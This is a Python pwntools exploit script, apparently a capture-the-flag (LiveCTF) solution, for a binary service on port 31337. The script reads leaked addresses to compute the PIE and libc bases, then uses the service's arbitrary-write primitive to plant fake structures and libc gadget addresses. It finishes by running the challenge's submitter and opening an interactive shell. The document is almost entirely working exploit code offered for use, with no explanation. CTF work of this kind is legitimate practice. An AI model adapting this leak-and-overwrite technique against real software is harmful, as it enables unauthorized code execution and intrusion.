from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))

s.recvuntil(b": ")
main = int(s.recvuntil(b"\n"), 16)
pie_base = main - 0x14ee

s.recvuntil(b": ")
var = int(s.recvuntil(b"\n"), 16)

s.recvuntil(b": ")
printf = int(s.recvuntil(b"\n"), 16)
libc = printf - 0x60100

def write(addr, value, again=True):
    s.sendlineafter(b"?\n", b"%x" % addr)
    s.sendlineafter(b"?\n", b"%x" % value)
    if again:
        s.sendlineafter(b"?\n", b"1")
    else:
        s.sendlineafter(b"?\n", b"0")

context.log_level = "debug"
time.sleep(0.1)
# raw_input("debug")

#write(pie_base + 0x20b8 + 408, 0x4141414142424242)
write(pie_base + 0x20b8 + 0x1e8, 0x41414141 - 0x41414139)
write(pie_base + 0x20b8 + 0x1f0, pie_base+0x20b8 + 0x80)
write(pie_base + 0x20b8 + 0x80, 0xdeadbeef)
write(pie_base + 0x20b8 + 0x88, 0xdeadbeef)
write(pie_base + 0x20b8 + 0x90, 0xdeadbeef)
write(pie_base + 0x20b8 + 0x98, 0xdeadbeef)
write(pie_base + 0x20b8 + 0xa0, 0xdeadbeef)
write(pie_base + 0x20b8 + 0xa8, 0xdeadbeef)
write(pie_base + 0x20b8 + 0xb0, 0xdeadbeef)
write(pie_base + 0x20b8 + 0xb8, 0xdeadbeef)
write(pie_base + 0x20b8 + 0xc0, 0xdeadbeef)
write(pie_base + 0x20b8 + 0xc8, 0xdeadbeef)
write(pie_base + 0x20b8 + 0x68, libc+0x58750+27)
write(pie_base + 0x20b8 + 0x70, libc+0x1cb42f)
write(pie_base + 0x20b8 + 0x78, 0xdeadbeef)
write(pie_base + 0x20b8 + 0x80, pie_base + 0x20b8 + 0x88 - 0x20)
write(pie_base + 0x20b8 + 0x88, libc + 0xa5688, again=False)

s.sendline("/home/livectf/submitter\n")
s.interactive()
